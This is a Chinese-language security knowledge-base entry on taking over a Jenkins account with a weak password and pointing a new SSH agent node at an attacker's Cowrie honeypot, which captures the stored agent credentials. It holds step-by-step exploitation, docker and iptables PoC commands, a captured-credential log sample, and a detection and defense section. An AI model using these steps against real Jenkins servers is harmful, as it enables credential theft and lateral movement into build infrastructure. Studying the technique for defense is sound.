---
id: cloud-cicd-jenkins-agent-admin-weak-password-node-credential-honeypot
title: Jenkins Agent 管理弱口令接管：新建指向蜜罐的节点骗取 agent SSH 凭据
type: scenario
domain: cloud
path: cloud/ci-cd
technique: jenkins-agent-admin-weak-password-node-credential-capture
aliases:
- Jenkins agent admin
- Jenkins 节点管理
- knave 弱口令
- New Node 蜜罐
- agent 凭据捕获
- Jenkins 凭据外送
tags:
- cicd
- jenkins
- agent
- weak-password
- credentials
- honeypot
- lateral-movement
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V658
  verified_at: '2026-11-13T06:42:17+08:00'
  notes: 已对照图10-13与蜜罐日志核对 knave/Agents admin、People 枚举、Launch agents via SSH + Host/Credentials(agent)/Non verifying；已将凭据表述修正为密码型（SSH 私钥不会在认证中传输）。
---

## 一句话结论

Jenkins 用户 `knave` 拥有 Agents admin 权限却使用弱口令，攻击者登录后可新建一个"Launch agents via SSH"的节点，把 Host 指向自己的蜜罐、Credentials 选择 Jenkins 中保存的 agent SSH 凭据并关闭 host key 校验；Jenkins 控制器主动连接蜜罐时会把 agent 用户名与密码交给攻击者（原文所配即密码型凭据），捕获后即可登录真实 agent 或横向。

## 原理

- **节点管理即凭据使用入口**：Jenkins 管理员可配置节点的启动方式（SSH）、目标 Host 与 Credentials；保存后控制器会用所选凭据主动 SSH 连接目标主机。
- **凭据"送上门"**：把 Host 改为攻击者可控地址后，Jenkins 会用真实 agent 凭据向该地址认证；蜜罐（如 Cowrie）记录登录尝试中的用户名/密码，攻击者因此获得 agent 凭据（若配置的是 SSH 私钥，认证过程只暴露用户名与公钥，私钥本身不会被传输）。
- **前提是弱口令 + 权限过大**：`knave:rockme` 一类弱口令可直接爆破/猜解，且该用户拥有 Agents admin；若权限受最小化约束则无法创建节点。
- **危害**：agent 凭据可登录真实 agent 主机，读取其上的构建产物/凭据，或从 agent 向控制器/内网横向；也可能被用于修改 agent 上的构建环境。

## 触发条件

- 攻击者可访问 Jenkins 登录页并爆破/猜解出拥有 agent 管理权限的弱口令账号。
- 该账号可新建/编辑节点，且能选择已有 agent SSH 凭据。
- Jenkins 允许节点 Host 指向任意地址（未做出站白名单/变更审批）。
- Jenkins 保存有可复用的 agent SSH 凭据（用户名密码或私钥）。

## 利用步骤

1. 枚举 Jenkins 用户（People 页面/登录错误提示），对 `knave` 等账号爆破，得到 `knave:rockme`。
2. 登录后进入 Manage Nodes → New Node（或复制 `agent1`），Node name 任意。
3. Launch method 选 `Launch agents via SSH`；Host 填攻击者服务器/蜜罐 IP；Credentials 选 `agent/****`；Host Key Verification Strategy 选 `Non verifying`。
4. Save/Launch 后，Jenkins 主动向蜜罐发起 SSH；Cowrie 记录 `login attempt [b'agent'/b'<密码或密钥>'] failed`。
5. 用捕获的 agent 用户名与密码登录真实 agent：`ssh agent@<real-agent>`；进一步读取构建环境与凭据。

## PoC

```bash
# 蜜罐与端口转发（原文）
docker run -p 2222:2222 cowrie/cowrie
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -P FORWARD ACCEPT
iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222
# 清理
iptables -L INPUT --line-numbers
iptables -D INPUT 7
iptables -t nat -L -n --line-numbers
iptables -t nat -D PREROUTING 2
```

Jenkins 节点配置：`Launch agents via SSH` / Host=攻击者 / Credentials=agent/**** / Non verifying。蜜罐日志示例：`login attempt [b'agent'/b'B1A648E1-FD8B-4D66-8CAF-78114F55D396'] failed`。

## 变体与关联

- **节点配置变体**：改现有节点 Host、用 JNLP/WebSocket 启动方式骗取 secret；凭据类型以密码型最直接（私钥型不会在认证中传输）。
- **同族**：[[cloud-cicd-github-app-private-key-runner-registration-token]]、[[cloud-cicd-github-runner-credentials-session-hijack]]（其他 CI 平台的 runner 凭据）。
- **横向**：拿到 agent 凭据后可读取 agent 上的 workspace、构建凭据与环境变量，进一步渗透。

## 检测与防御

- **口令与权限**：Jenkins 启用强口令/MFA；Agents admin 权限最小化，普通用户不可管理节点；定期审计用户权限。
- **凭据作用域**：agent 凭据限定到具体节点/文件夹，禁止在任意节点复用；使用临时凭据/OIDC。
- **出站控制**：限制 Jenkins 控制器向任意地址发起 SSH；节点 Host 变更需审批/白名单；启用 host key 校验。
- **检测**：监控节点创建/修改事件、异常 Host、SSH 出站连接与认证失败；蜜罐/威胁情报可发现此类"凭据外送"。
- **响应**：发现后立即轮换 agent 凭据、禁用被控账号、排查 agent 主机与构建产物。
